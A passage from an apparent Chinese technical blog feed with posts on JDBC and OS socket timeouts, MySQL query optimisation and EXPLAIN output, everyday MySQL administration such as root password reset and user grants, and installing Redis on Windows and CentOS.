&lt;tx:attributes&gt;          &lt;tx:method name="…" timeout="3"/&gt;  &lt;/tx:attributes&gt;  
​		Spring提供的transaction timeout配置非常简单，它会记录每个事务的开始时间和消耗时间，当特定的事件发生时就会对消耗时间做校验，当超出timeout值时将抛出异常。
Spring中，被保存在ThreadLocal里，这被称为事务同步（Transaction Synchronization），与此同时，事务的开始时间和消耗时间也被保存下来。当使用这种代理连接创建statement时，就会校验事务的消耗时间。EJB CMT的实现方式与之类似，其结构本身也十分简单。
当你选用的容器或框架并不支持transaction timeout这一特性，你可以考虑自己来实现。transaction timeout并没有标准的API。Lucy框架的1.5和1.6版本都不支持transaction timeout，但是你可以通过使用Spring的Transaction Manager来达到与之同样的效果。
假设某个事务中包含5个statement，每个statement的执行时间是200ms，其他业务逻辑的执行时间是100ms，那么transaction timeout至少应该设置为1,100ms（200 * 5 + 100）。
Statement Timeout
​		statement timeout用来限制statement的执行时长，timeout的值通过调用JDBC的.sql.Statement.setQueryTimeout(int timeout) API进行设置。不过现在开发者已经很少直接在代码中设置，而多是通过框架来进行设置。
以iBatis为例，statement timeout的默认值可以通过map-config.xml中的defaultStatementTimeout 属性进行设置。同时，你还可以设置sqlmap中select，insert，update标签的timeout属性，从而对不同sql语句的超时时间进行独立的配置。
如果你使用的是Lucy1.5或1.6版本，通过设置queryTimeout属性可以在datasource层面对statement timeout进行设置。
statement timeout的具体值需要依据应用本身的特性而定，并没有可供推荐的配置
QueryTimeout处理过程


通过调用Connection的createStatement()方法创建statement


调用statement的executeQuery()方法


statement通过自身connection将query发送给MySQL数据库


statement创建一个新的timeout-execution线程用于超时处理


5.1版本后改为每个connection分配一个timeout-execution线程


向timeout-execution线程进行注册


达到超时时间


TimerThread调用JtdsStatement实例中的TsdCore.cancel()方法


timeout-execution线程创建一个和statement配置相同的connection


使用新创建的connection向超时query发送cancel query（KILL QUERY “connectionId”）



JDBC的socket timeout
​		JDBC的 timeout在被突然停掉或是发生网络错误（由于设备故障等原因）时十分重要。由于TCP/IP的结构原因，socket没有办法探测到网络错误，因此应用也无法主动发现断开。如果没有设置socket timeout的话，应用在数据库返回结果前会无期限地等下去，这种连接被称为dead connection。
为了避免dead connections，socket必须要有超时配置。socket timeout可以通过JDBC设置，socket timeout能够避免应用在发生网络错误时产生无休止等待的情况，缩短服务失效的时间。
不推荐使用socket timeout来限制statement的执行时长，因此socket timeout的值必须要高于statement timeout，否则，socket timeout将会先生效，这样statement timeout就变得毫无意义，也无法生效。
​		下面展示了socket timeout的两个设置项，不同的JDBC驱动其配置方式会有所不同。


socket连接时的timeout：通过**Socket.connect(SocketAddress endpoint, int timeout)**设置


socket读写时的timeout：通过**Socket.setSoTimeout(int timeout)**设置


通过查看CUBRID，MySQL，MS SQL Server (JTDS)和Oracle的JDBC驱动源码，我们发现所有的驱动内部都是使用上面的2个API来设置socket timeout的。

connectTimeout和socketTimeout的默认值为0时，timeout不生效。

操作系统的socket timeout配置
​		如果不设置 timeout或connect timeout，应用多数情况下是无法发现网络错误的。因此，当网络错误发生后，在连接重新连接成功或成功接收到数据之前，应用会无限制地等下去。但是，通过本文开篇处的实际案例我们发现，30分钟后应用的连接问题奇迹般的解决了，这是因为操作系统同样能够对socket timeout进行配置。公司的Linux服务器将socket timeout设置为了30分钟，从而会在操作系统的层面对网络连接做校验，因此即使JDBC的socket timeout设置为0，由网络错误造成的问题的持续时间也不会超过30分钟。
通常，应用会在调用Socket.read()时由于网络问题被阻塞住，而很少在调用Socket.write()时进入waiting状态，这取决于网络构成和错误类型。当Socket.write()被调用时，数据被写入到操作系统内核的缓冲区，控制权立即回到应用手上。因此，一旦数据被写入内核缓冲区，Socket.write() 调用就必然会成功。但是，如果系统内核缓冲区由于某种网络错误而满了的话，Socket.write()也会进入waiting状态。这种情况下，操作系统会尝试重新发包，当达到重试的时间限制时，将产生系统错误。在我们公司，重新发包的超时时间被设置为15分钟。
FAQ
Q1. 我已经使用Statement.setQueryTimeout()方法设置了查询超时，但在网络出错时并没有产生作用。
➔ 查询超时仅在socket timeout生效的前提下才有效，它并不能用来解决外部的网络错误，要解决这种问题，必须设置JDBC的socket timeout。
Q2. transaction timeout，statement timeout和 timeout和DBCP的配置有什么关系？
➔ 当通过DBCP获取时，除了DBCP获取连接时的waitTimeout配置以外，其他配置对JDBC没有什么影响。
Q3. 如果设置了JDBC的socket timeout，那DBCP连接池中处于IDLE状态的连接是否也会在达到超时时间后被关闭？
➔ 不会。socket的设置只会在产生数据读写时生效，而不会对DBCP中的IDLE连接产生影响。当DBCP中发生新连接创建，老的IDLE连接被移除，或是连接有效性校验的时候，socket设置会对其产生一定的影响，但除非发生网络问题，否则影响很小。
JDBC安全链接警告
用JDBC连接Mysql 5.6的时候，log里面一直有如下的warning, 虽然并不是error，但是log里面在每次连接数据库的时候会一直打印这个warning.
WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.
可以在JDBC的配置里面添加useSSL=false配置使用非SSL连接即可：
jdbc.url=jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false
备注：启用SSL加密连接后，性能必然会有下降
由于SSL开销较大的环节在建立连接，所以短链接的开销可能会更大，因此推荐使用长连接或者连接池的方式来减小SSL所带来的额外开销，不过好在MySQL的应用习惯大部分也是长连接的方式。
总结
1.MySQL 5.7配置SSL要比5.6来的简单的多
2.MySQL 5.7客户端默认开启SSL加密连接
3.通常来说，开启SSL加密连接后，性能最大的开销在25%左右
]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL查询优化策略</title>
    <url>/20221031/ec788ee4.html</url>
    <content><![CDATA[查询优化策略



建议
原因




不要使用 select * from t
任何地方都不要使用  select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段


控制查询结果的大小
尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。


考虑在 where 及  order by 涉及的列上建立索引



避免在 where 子句中使用!=或&lt;&gt;操作符
否则将引擎放弃使用索引而进行全表扫描


避免在 where 子句中对字段进行 null 值判断（可以用空白或0这样的默认值替代W）
否则将引擎放弃使用索引而进行全表扫描


LEFT JOIN 将可能的组合条件放到Where中



查询时候的like条件，减少前置百分号
考虑全文检索？


尽量避免在 where 子句中使用 or 来连接条件
否则将引擎放弃使用索引而进行全表扫描： select id from t where num=10 or num=20可以这样查询：select id from t where num=10union allselect id from t where num=20


in 和 not in 也要慎用，否则会导致全表扫描
select id from  t where num in(1,2,3)对于连续的数值，能用 between 就不要用 in 了select id from t where num between 1 and 3


很多时候可以用  exists 代替 in
select num from  a where num in(select num from b) 用下面的语句替换：select num from a where exists(select 1 from b where num=a.num)


使用数字型字段（数据只含有数字）
若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会 逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。


避免在 where 子句中对字段进行表达式操作或者函数操作等
否则将导致引擎放弃使用索引而进行全表扫描。如：select id from  t where num/2=100应改为: select id from  t where num=100*2select id from t where substring(name,1,3)=’abc’;select id from t where datediff(day,createdate,’2005-11-30′)=0应改为:select id from t where name like ‘abc%’select id from t where createdate &gt;= ’2005-11-30′ and createdate &lt; ’2005-12-1′


使用符合索引，查询条件必须使用到其第一个字段。
在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使 用，并且应尽可能的让字段顺序与索引顺序相一致。


不要写一些没有意义的查询，减少资源占用
如需要生成一个空表结构：select col1,col2 into #t from t where 1=0这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：create table #t(…)


对大量重复的数据列建索引无太大意义
并不是所有索引对查询都有效SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引如一表中有字段 sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。


使用索引会提高select的效率，降低insert 及 update 的效率
索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引


尽可能的使用 varchar/nvarchar 代替 char/nchar
因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。


应尽可能的避免更新 clustered 索引数据列
因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。



Explain关键字
​		explain显示了MySQL如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。简单讲，它的作用就是分析查询性能。
​		explain关键字的使用方法很简单，就是把它放在select查询语句的前面。
​		mysql查看是否使用索引，简单的看type类型就可以。如果它是all，那说明这条查询语句遍历了所有的行，并没有使用到索引。
explain select * from company_info where cname like '%小%'

explain select * from company_info where cname like '小%'

Explain查询结果说明



id列数字越大越先执行，如果说数字一样大，那么就从上往下依次执行，id列为null的就表是这是一个结果集，不需要使用它来进行查询。


select_type列常见的有



参数
说明




simple
表示不需要union操作或者不包含子查询的简单select查询。有连接查询时，外层的查询为simple，且只有一个


primary
一个需要union操作或者含有子查询的select，位于最外层的单位查询的select_type即为primary。且只有一个


union
union连接的两个select查询，第一个查询是dervied派生表，除了第一个表外，第二个以后的表select_type都是union


dependent union
与union一样，出现在union 或union all语句中，但是这个查询要受到外部查询的影响


union result
包含union的结果集，在union和union all语句中,因为它不需要参与查询，所以id字段为null


subquery
除了from字句中包含的子查询外，其他地方出现的子查询都可能是subquery


dependent subquery
与dependent union类似，表示这个subquery的查询要受到外部表查询的影响


derived
from字句中出现的子查询，也叫做派生表，其他数据库中可能叫做内联视图或嵌套select





table


如果查询使用了别名，那么这里显示的是别名


如果不涉及对数据表的操作，那么这显示为null，


如果显示为尖括号括起来的就表示这个是临时表，后边的N就是执行计划中的id，表示结果来自于这个查询产生。


如果是尖括号括起来的&lt;union M,N&gt;，与类似，也是一个临时表，表示这个结果来自于union查询的id为M,N的结果集。




type
依次从好到差：system，const，eq_ref，ref，fulltext，ref_or_null，unique_subquery，index_subquery，range，index_merge，index，ALL，
除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引



参数
说明




system
表中只有一行数据或者是空表，且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index


const
使用唯一索引或者主键，返回记录一定是1行记录的等值where条件时，通常type是const。其他数据库也叫做唯一索引扫描


eq_ref
出现在要连接过个表的查询计划中，驱动表只返回一行数据，且这行数据是第二个表的主键或者唯一索引，且必须为not  null，唯一索引和主键是多列时，只有所有的列都用作比较时才会出现eq_ref


ref
不像eq_ref那样要求连接顺序，也没有主键和唯一索引的要求，只要使用相等条件检索时就可能出现，常见与辅助索引的等值查找。或者多列主键、唯一索引中，使用第一个列之外的列作为等值查找也会出现，总之，返回数据不唯一的等值查找就可能出现。


fulltext
全文索引检索，要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引


ref_or_null
与ref方法类似，只是增加了null值的比较。实际用的不多。


unique_subquery
用于where中的in形式子查询，子查询返回不重复值唯一值


index_subquery
用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重。


range
索引范围扫描，常见于使用&gt;,&lt;,is null,between ,in ,like等运算符的查询中。


index_merge
表示查询使用了两个以上的索引，最后取交集或者并集，常见and  ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取所个索引，性能可能大部分时间都不如range


index
索引全表扫描，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询。


all
这个就是全表扫描数据文件，然后再在server层进行过滤返回符合要求的记录。





possible_keys
查询可能使用到的索引都会在这里列出来


key
查询真正使用到的索引，select_type为index_merge时，这里可能出现两个以上的索引，其他的select_type这里只会出现一个。


key_len
用于处理查询的索引长度，如果是单列索引，那就整个索引长度算进去，如果是多列索引，那么查询不一定都能使用到所有的列，具体使用到了多少个列的索引，这里就会计算进去，没有使用到的列，这里不会计算进去。留意下这个列的值，算一下你的多列索引总长度就知道有没有使用到所有的列了。要注意，mysql的ICP特性使用到的索引不会计入其中。另外，key_len只计算where条件用到的索引长度，而排序和分组就算用到了索引，也不会计算到key_len中。


ref
如果是使用的常数等值查询，这里会显示const，如果是连接查询，被驱动表的执行计划这里会显示驱动表的关联字段，如果是条件使用了表达式或者函数，或者条件列发生了内部隐式转换，这里可能显示为func


rows
这里是执行计划中估算的扫描行数，不是精确值


extra


​	性能从好到坏:useing index&gt;usinh where &gt; using temporary &gt; using filesort



参数
说明




distinct
在select部分使用了distinc关键字


no tables used
不带from字句的查询或者From dual查询。 使用not in()形式子查询或not  exists运算符的连接查询，这种叫做反连接。即，一般连接查询是先查询内表，再查询外表，反连接就是先查询外表，再查询内表


using filesort
排序时无法使用到索引时，就会出现这个。常见于order by和group by语句中


using index
查询时不需要回表查询，直接通过索引就可以获取查询的数据


using_union
表示使用or连接各个使用索引的条件时，该信息表示从处理结果获取并集


using intersect
表示使用and的各个索引的条件时，该信息表示是从处理结果获取交集


using sort_union和using  sort_intersection
与前面两个对应的类似，只是他们是出现在用and和or查询信息量大时，先查询主键，然后进行排序合并后，才能读取记录并返回


using where
表示存储引擎返回的记录并不是所有的都满足查询条件，需要在server层进行过滤。查询条件中分为限制条件和检查条件，5.6之前，存储引擎只能根据限制条件扫描数据并返回，然后server层根据检查条件进行过滤再返回真正符合查询的数据。5.6.x之后支持ICP特性，可以把检查条件也下推到存储引擎层，不符合检查条件和限制条件的数据，直接不读取，这样就大大减少了存储引擎扫描的记录数量。extra列显示using  index condition


using temporary
表示使用了临时表存储中间结果。临时表可以是内存临时表和磁盘临时表，执行计划中看不出来，需要查看status变量，used_tmp_table，used_tmp_disk_table才能看出来


firstmatch(tb_name)
5.6.x开始引入的优化子查询的新特性之一，常见于where字句含有in()类型的子查询。如果内表的数据量比较大，就可能出现这个


loosescan(m…n)
5.6.x之后引入的优化子查询的新特性之一，在in()类型的子查询中，子查询返回的可能有重复记录时，就可能出现这个


filtered
使用explain extended时会出现这个列，5.7之后的版本默认就有这个字段，不需要使用explain  extended了。这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数



]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL日常使用记录</title>
    <url>/20221031/25158cd7.html</url>
    <content><![CDATA[MyBaties调用MySQL数据库查询无结果,查询语句正确

DEBUG 进去源码，排查最终提交的SQL语句中文乱码
检查数据库编码是否为UTF-8
修改MySQL的连接配置：jdbc:mysql://127.0.0.1:3306/qhswdxssplog?useUnicode=true&amp;characterEncoding=UTF-8

将多行查询结果合并到一行
GROUP_CONCAT：默认连接符号是逗号SELECT GROUP_CONCAT(A_TABLE_ID) FRON A_TABLE#查询某分类的所有子分类并用分号连接子分类IDSELECT GROUP_CONCAT(A_TABLE_ID SEPARATOR ';') FRON A_TABLE#查询某分类的所有子分类，根据p_order ASC, cat_id DESC排序后再连接SELECT GROUP_CONCAT(cat_id ORDER BY p_order ASC, cat_id DESC) FROM goods_cat WHERE pid = 25
数据库更新操作关于不同数据库的update set from where操作
用来同步两个表的数据
(Mysql)语句：    UPDATE A, B SET A_1 = B_1, A_2 = B_2, A_3 = B_3 WHERE A.ID = B.ID(Oralce)语句：    UPDATE A SET (A1, A2, A3) = (SELECT B1, B2, B3 FROM B WHERE A.ID = B.ID)    WHERE ID IN (SELECT B.ID FROM B WHERE A.ID = B.ID)(MS SQL Server)语句：    UPDATE A SET A1 = B1, A2 = B2, A3 = B3 FROM A, B WHERE A.ID = B.ID
update set from 语句格式
​		当where和set都需要关联一个表进行查询时，整个 update执行时，就需要对被关联的表进行两次扫描，显然效率比较低。对于这种情况，Sybase和SQL SERVER的解决办法是使用UPDATE…SET…FROM…WHERE…的语法，实际上就是从源表获取更新数据。
​		在 SQL 中，表连接（left join、right join、inner join 等）常常用于 select 语句，其实在 SQL 语法中，这些连接也是可以用于update 和 delete 语句的，在这些语句中使用 join 还常常得到事半功倍的效果。
Update T_OrderForm SET T_OrderForm.SellerID =B.L_TUserIDFROM T_OrderForm A LEFT JOIN T_ProductInfo B ON B.L_ID=A.ProductID
​
获取建表命令
show create table 旧表;
这样会将旧表的创建命令列出。我们只需要将该命令拷贝出来，更改table的名字，就可以建立一个完全一样的表
将表1内容全部复制到表2
复制旧表的数据到新表(假设两个表结构一样)   SELECT * INTO 表2 FROM 表1;   复制旧表的数据到新表(假设两个表结构不一样)   INSERT INTO 新表(字段1,字段2,.......)    SELECT 字段1,字段2,...... FROM 旧表
修改表/字段的注释
创建表的时候写注释   create table test1(field_name int comment '字段的注释') comment='表的注释';   修改表的注释   alter table test1 comment '修改后的表的注释';修改字段的注释--注意：字段名和字段类型照写就行   alter table test1 modify column field_name int comment '修改后的字段注释';   
数据表切换数据库
RENAME TABLE db_A.table_1 TO db_B.table_2
MySQL自增主键列重新排列
ALTER TABLE 表名 DROP 列名;ALTER TABLE 表名 ADD 列名 MEDIUMINT(8) NOT NULL FIRST;ALTER TABLE 表名 MODIFY COLUMN 列名 MEDIUMINT(8) NOT NULL AUTO_INCREMENT,ADD PRIMARY KEY(列名);
自动修改更改时间
ALTER TABLE ware_resource_info MODIFY res_create_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP;ALTER TABLE ware_resource_info MODIFY modify_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;
linux下mysql-5.6忘记root密码
在linux平台下使用mysql过程中忘记了root密码，对于运维和DBA来讲都是一件头疼的事情，下面来讲解下怎么进行重置mysql数据库root 密码：


停止mysql服务进程： service mysqld stop


然后编辑mysql的配置文件my.cnf  vim /etc/my.cnf


找到 [mysqld]这个模块：在最后面添加一段代码，可忽略mysql权限问题，直接登录
skip-grant-tables


​		然后保存 :wq!退出
​		启动mysql服务
service mysqld start
直接进入mysql数据库：
 Starting MySQL. SUCCESS![root@web1 ~]# mysqlWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.6.34 Source distributionCopyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt;
使用mysql表，然后进行修改mysql的root密码：
mysql&gt; use mysql; #使用mysql数据库Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set password=password("123456") where user="root";#更新密码Query OK, 4 rows affected (0.00 sec)Rows matched: 4 Changed: 4 Warnings: 0mysql&gt; flush privileges;#刷新权限Query OK, 0 rows affected (0.00 sec)
补充说明：5.7的更新语句
update mysql.user set authentication_string=password('root') where user='root' ;
[root@web1 ~]# ps -ef |grep mysql #显示mysql现有的进程root 56407 1 0 17:50 pts/0 00:00:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --datadir=/data/mysql --pid-file=/data/mysql/web1.pidmysql 56533 56407 0 17:50 pts/0 00:00:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/data/mysql --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/data/mysql/web1.err --pid-file=/data/mysql/web1.pidroot 56560 1737 0 17:55 pts/0 00:00:00 grep mysql[root@web1 ~]# killall mysqld #删除mysql现有进程[root@web1 ~]# ps -ef |grep mysqlroot 56566 1737 0 17:56 pts/0 00:00:00 grep mysql[root@web1 ~]# service mysqld start #重新启动mysql服务Starting MySQL. SUCCESS![root@web1 ~]# mysql -uroot -p #使用新密码登录Enter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.6.34 Source distributionCopyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt;
MySQL5.7.X版本only_full_group_by问题解决


报错信息
[Err] 1055 - Expression #1 of ORDER BY clause is not in GROUP BY clause and contains nonaggregated column 'information_schema.PROFILING.SEQ' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by
可以看出是因为sql_mode中设置了only_full_group_by模式引起的。


sql_mode的作用是什么呢
模式定义MySQL会支持哪些SQL语法。以及应执行哪种数据验证检查。最终达到的目标：适应在不同环境中适应mysql，因为可以根据各自的程序设置不同的操作模式。
在only_full_group_by这种模式下，使用group by语句进行查询时，所要查询的语句必须依赖于group by子句中所列出的列，也就是group by要以查询的字段作为分组依据，这里是要查询的所有字段。


常用的sql_mode



参数
说明




ONLY_FULL_GROUP_BY
对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP  BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中


NO_AUTO_VALUE_ON_ZERO
该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户  希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。


STRICT_TRANS_TABLES
在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE。在严格模式下，不允许日期和月份为零。


NO_ZERO_DATE
设置该值，MySQL数据库不允许插入零日期，插入零日期会抛出错误而不是警告。


ERROR_FOR_DIVISION_BY_ZERO
在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL


NO_AUTO_CREATE_USER
禁止GRANT创建密码为空的用户


NO_ENGINE_SUBSTITUTION
如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常


PIPES_AS_CONCAT
将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似


ANSI_QUOTES
启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符





查询当前的sql_mode配置
1. 可以使用select @@global.sql_mode; //全局配置 查询，2. 也可以通过select @@sql_mode;//已存在数据库配置查询


解决方法


使用any_value()函数,这个函数对不需要group by的字段有效，等同于关闭only_full_group_by，但是这样难免会遗漏某个字段，所以不推荐使用。


暂时性关闭（可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制过来），但是在重启服务以后失效
set sql_mode=' ' //改变已经存在的数据库sql_mode set @@global.sql_mode=' ' //改变全局配置sql_mode


更改配置文件（推荐使用）
可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制配置参数linux系统更改/etc/my.cnf文件使用vi命令打开，如果有sql_mode=...的注释就把注释打开，如果没有就加上sql_mode=...Windows系统修改安装目录下的my.ini文件，其余同上




]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL用户管理</title>
    <url>/20221031/ad072d5f.html</url>
    <content><![CDATA[MySQL 创建用户并授权
一、创建用户:
命令:
CREATE USER ‘username’@‘host’ IDENTIFIED BY ‘password’;
说明:
username - 你将创建的用户名,
host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%.
password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.
例子:
CREATE USER 'dog'@'localhost' IDENTIFIED BY '123456'; CREATE USER 'pig'@'192.168.1.101_' IDENDIFIED BY '123456'; CREATE USER 'pig'@'%' IDENTIFIED BY '123456'; CREATE USER 'pig'@'%' IDENTIFIED BY ''; CREATE USER 'pig'@'%'; 
二、授权:
命令:
GRANT privileges ON databasename.tablename TO 'username'@'host'
说明:
privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等(详细列表见该文最后面).如果要授予所的权限则使用ALL.;
databasename - 数据库名,
tablename-表名, 如果要授予该用户对所有数据库和表的相应操作权限则可用表示, 如.*.
例子:
GRANT SELECT, INSERT ON test.user TO 'pig'@'%'; GRANT ALL ON *.* TO 'pig'@'%'; 
注意:用以上命令授权的用户不能给其它用户授权,
如果想让该用户可以授权,用以下命令:
GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;
三、 设置与更改用户密码
命令:
SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
如果是当前登陆用户用
SET PASSWORD = PASSWORD("newpassword"); 
非当前用户
SET PASSWORD FOR 'pig'@'%' = PASSWORD("123456"); 
四、撤销用户权限
命令:
REVOKE privilege ON databasename.tablename FROM 'username'@'host';
说明: privilege, databasename, tablename - 同授权部分.
例子:
REVOKE SELECT ON *.* FROM 'pig'@'%'; 注意: 假如你在给用户'pig'@'%'授权的时候是这样的(或类似的):GRANT SELECT ON test.user TO 'pig'@'%',则在使用REVOKE SELECT ON *.* FROM 'pig'@'%';命令并不能撤销该用户对test数据库中user表的SELECT 操作.相反,如果授权使用的是GRANT SELECT ON *.* TO 'pig'@'%';则REVOKE SELECT ON test.user FROM 'pig'@'%';命令也不能撤销该用户对test数据库中user表的Select 权限. 具体信息可以用命令SHOW GRANTS FOR 'pig'@'%'; 查看. 
五、删除用户
命令:
DROP USER 'username'@'host';
附表:在MySQL中的操作权限



ALTER
Allows use  of ALTER TABLE.




ALTER ROUTINE
Alters or drops  stored routines.


CREATE
Allows use  of CREATE TABLE.


CREATE ROUTINE
Creates stored  routines.


CREATE TEMPORARY  TABLE
Allows use  of CREATE TEMPORARY TABLE.


CREATE USER
Allows use  of CREATE USER, DROP USER, RENAME USER, and REVOKE ALL PRIVILEGES.


CREATE VIEW
Allows use  of CREATE VIEW.


DELETE
Allows use  of DELETE.


DROP
Allows use  of DROP TABLE.


EXECUTE
Allows the user  to run stored routines.


FILE
Allows use  of SELECT… INTO OUTFILE and LOAD DATA INFILE.


INDEX
Allows use  of CREATE INDEX and DROP INDEX.


INSERT
Allows use  of INSERT.


LOCK TABLES
Allows use  of LOCK TABLES on tables for which the user also  has SELECT privileges.


PROCESS
Allows use  of SHOW FULL PROCESSLIST.


RELOAD
Allows use  of FLUSH.


REPLICATION
Allows the user  to ask where slave or master


CLIENT
servers are.


REPLICATION  SLAVE
Needed for  replication slaves.


SELECT
Allows use  of SELECT.


SHOW DATABASES
Allows use  of SHOW DATABASES.


SHOW VIEW
Allows use  of SHOW CREATE VIEW.


SHUTDOWN
Allows use  of mysqladmin shutdown.


SUPER
Allows use  of CHANGE MASTER, KILL, PURGE MASTER LOGS, and SET  GLOBAL SQL statements. Allows mysqladmin debug command. Allows  one extra connection to be made if maximum connections are reached.


UPDATE
Allows use  of UPDATE.


USAGE
Allows connection  without any specific privileges.



]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis安装</title>
    <url>/20221102/c9f6f059.html</url>
    <content><![CDATA[单机安装：Windows
Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。
下载地址：
windows版本： https://github.com/MSOpenTech/redis/releasesLinux版本：官网下载： http://www.redis.cn/git下载：https://github.com/antirez/redis/releases
我们现在讨论的是windows下的安装部署，目前windows下最新版本是：3.2.100。下载地址，提供多种下载内容，
 Redis-x64-3.2.100.msi是在windows下，最简单的安装文件，方便，直接会将Redis写入windows服务。Redis-x64-3.2.100.zip是需要解压安装的，接下来讨论的是这种。Source code (zip) 源码的zip压缩版Source code (tar.gz) 源码的tar.gz压缩版 

安装
解压安装将下载的Redis-x64-3.2.100.zip 解压到某个地址。

启动命令通过cmd指定到该redis目录。
使用命令：redis-server.exe 启动服务

出现这种效果，表明启动服务成功。启动另一个cmd，在该redis目录下，使用命令：redis-cli.exe 启动客户端,连接服务器

出现这种效果，表明启动客户度成功。
部署
由于上面虽然启动了redis服务，但是，只要一关闭cmd窗口，redis服务就关闭了。所以，把redis设置为一个windows服务。
安装之前，windows服务是不包含redis服务的
安装为windows服务安装命令:

redis-server.exe --service-install redis.windows.conf
使用命令，安装成功，如图所示

最后的参数 --loglevel verbose表示记录日志等级
安装之后，windows目前的服务列表

常用的redis服务命令。
卸载服务：redis-server --service-uninstall开启服务：redis-server --service-start停止服务：redis-server --service-stop重命名服务：redis-server --service-name name
重命名服务，需要写在前三个参数之后
例如： The following would install and start three separate instances of Redis as a service:
以下将会安装并启动三个不同的Redis实例作服务：
redis-server --service-install --service-name redisService1 --port 10001redis-server --service-start --service-name redisService1redis-server --service-install --service-name redisService2 --port 10002redis-server --service-start --service-name redisService2redis-server --service-install --service-name redisService3 --port 10003redis-server --service-start --service-name redisService3
四：测试启动服务
客户端命令
redis-server --service-start
精简模式
redis-cli.exe
指定模式
redis-cli.exe -h 127.0.0.1 -p 6379 -a requirepass



参数
说明




-h
服务器地址


-p
指定端口号


-a
连接数据库的密码[可以在redis.windows.conf中配置]，默认无密码




安装测试成功。
单机安装：Centos
准备

下载redis安装包

 wget http://download.redis.io/releases/redis-4.0.6.tar.gz


解压压缩包

tar zxvf redis-4.0.6.tar.gz


yum安装gcc依赖

